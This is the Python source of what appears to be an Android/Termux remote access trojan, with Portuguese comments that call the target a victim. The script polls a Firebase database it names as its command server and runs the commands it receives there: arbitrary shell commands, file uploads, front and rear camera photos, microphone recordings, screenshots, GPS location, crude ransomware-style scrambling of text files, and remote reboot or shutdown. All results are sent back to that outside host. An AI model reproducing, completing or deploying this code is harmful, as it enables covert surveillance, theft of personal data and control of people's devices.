import os
import json
import time
import base64
import requests
import subprocess
import re
from datetime import datetime

=== Captura o e-mail da vítima como ID ===

def get_email_android():
try:
saida = os.popen("cmd accounts list").read()
emails = re.findall(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+.[a-zA-Z0-9-.]+", saida)
if emails:
return emails[0]
except:
pass
return "vitima_desconhecida"

vitima_id = get_email_android()

=== Firebase C2 ===

firebase_url = "https://vibe-chat-b1e67-default-rtdb.firebaseio.com"

=== Logs locais e no Firebase ===

def salvar_log(evento):
print(f"[LOG] {evento}")
log_path = f"{vitima_id}_log.txt"
with open(log_path, "a") as f:
f.write(f"{datetime.now()} - {evento}\n")
requests.put(f"{firebase_url}/logs/{vitima_id}.json", json.dumps({"log": evento}))

=== Envia arquivo como base64 ===

def upload_arquivo(caminho):
try:
with open(caminho, "rb") as f:
dados = base64.b64encode(f.read()).decode()
nome = os.path.basename(caminho)
requests.put(f"{firebase_url}/arquivos/{vitima_id}/{nome}.json", json.dumps({"arquivo": dados}))
return f"Arquivo '{nome}' enviado (base64)"
except Exception as e:
return f"Erro ao enviar arquivo: {str(e)}"

=== Executa shell com segurança ===

def exec_shell(acao):
try:
cmd = acao[4:]
saida = subprocess.check_output(cmd, shell=True).decode()
return saida or "Executado"
except Exception as e:
return f"Erro shell: {str(e)}"

=== Executa o comando ===

def executar_comando(comando):
categoria = comando.get("categoria")
acao = comando.get("acao")
resposta = "Comando inválido"

try:
if categoria == "sistema":
if acao == "listar_arquivos":
resposta = "\n".join(os.listdir("."))
elif acao == "info_usuario":
resposta = f"Usuário: {vitima_id}"
elif acao == "bateria":
resposta = os.popen("termux-battery-status").read()

elif categoria == "shell" and acao.startswith("cmd:"):    
    resposta = exec_shell(acao)    

elif categoria == "arquivo":    
    if acao.startswith("baixar:"):    
        nome = acao.split(":")[1]    
        resposta = upload_arquivo(nome)    

elif categoria == "foto":    
    if acao == "tirar:frontal":    
        os.system("termux-camera-photo -c 1 frontal.jpg")    
        resposta = upload_arquivo("frontal.jpg")    
    elif acao == "tirar:traseira":    
        os.system("termux-camera-photo -c 0 traseira.jpg")    
        resposta = upload_arquivo("traseira.jpg")    

elif categoria == "audio":    
    if acao == "gravar_5s":    
        os.system("termux-microphone-record -l 5 -f audio.wav")    
        resposta = upload_arquivo("audio.wav")    
    elif acao == "gravar_10s":    
        os.system("termux-microphone-record -l 10 -f audio.wav")    
        resposta = upload_arquivo("audio.wav")    

elif categoria == "tela":    
    os.system("screencap -p tela.png")    
    resposta = upload_arquivo("tela.png")    

elif categoria == "localizacao" and acao == "gps":    
    local = os.popen("termux-location").read()    
    resposta = local    

elif categoria == "criptografia":    
    senha = "hackerkira12345"    
    for nome in os.listdir("."):    
        if nome.endswith(".txt"):    
            with open(nome, "rb") as f:    
                dados = f.read()    
            if acao == "criptografar":    
                dados_mod = base64.b64encode(dados[::-1])    
            elif acao == "descriptografar":    
                dados_mod = base64.b64decode(dados)[::-1]    
            else:    
                continue    
            with open(nome, "wb") as f:    
                f.write(dados_mod)    
    resposta = "Arquivos processados com criptografia"    

elif categoria == "mensagem":    
    if acao == "alerta":    
        os.system("termux-toast '⚠️ ALERTA REMOTO'")    
        resposta = "Alerta enviado"    
    elif acao == "popup":    
        os.system("termux-dialog --title 'Mensagem' --text 'Você recebeu uma mensagem.'")    
        resposta = "Popup mostrado"    

elif categoria == "controle":    
    if acao == "reiniciar":    
        resposta = "Reiniciando..."    
        os.system("reboot")    
    elif acao == "desligar":    
        resposta = "Desligando..."    
        os.system("reboot -p")    
    elif acao == "sair":    
        resposta = "Encerrando script"    
        enviar_resposta(resposta)    
        exit()

except Exception as e:
resposta = f"Erro geral: {str(e)}"

salvar_log(f"[{categoria}] {acao} => {resposta}")
enviar_resposta(resposta)

=== Envia resposta ao Firebase ===

def enviar_resposta(resposta):
try:
url = f"{firebase_url}/respostas/{vitima_id}.json"
requests.put(url, json={"resposta": resposta})
except:
pass

=== Busca comando do servidor ===

def buscar_comando():
try:
url = f"{firebase_url}/comandos/{vitima_id}.json"
response = requests.get(url)
if response.status_code == 200 and response.text != "null":
comando = response.json()
executar_comando(comando)
except:
pass

=== Loop principal ===

while True:
buscar_comando()
time.sleep(5)

